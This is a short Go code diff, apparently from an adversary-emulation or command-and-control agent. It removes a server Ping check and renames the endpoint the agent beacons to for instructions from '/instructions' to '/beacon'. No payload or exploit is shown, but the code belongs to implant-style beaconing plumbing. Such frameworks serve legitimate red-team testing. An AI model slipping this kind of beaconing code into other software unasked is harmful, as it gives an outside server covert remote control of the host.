@@ -22,22 +22,10 @@ func init() {
 	CommunicationChannels["HTTP"] = API{}
 }
 
-//Ping tests connectivity to the server
-func (contact API) Ping(server string) bool {
-	address := fmt.Sprintf("%s/ping", server)
-	bites := request(address, nil)
-	if(string(bites) == "pong") {
-		output.VerbosePrint("[+] Ping success")
-		return true;
-	}
-	output.VerbosePrint("[+] Ping failure")
-	return false;
-}
-
 //GetInstructions sends a beacon and returns instructions
 func (contact API) GetInstructions(profile map[string]interface{}) map[string]interface{} {
 	data, _ := json.Marshal(profile)
-	address := fmt.Sprintf("%s/instructions", profile["server"])
+	address := fmt.Sprintf("%s/beacon", profile["server"])
 	bites := request(address, data)
 	var out map[string]interface{}
 	if bites != nil {
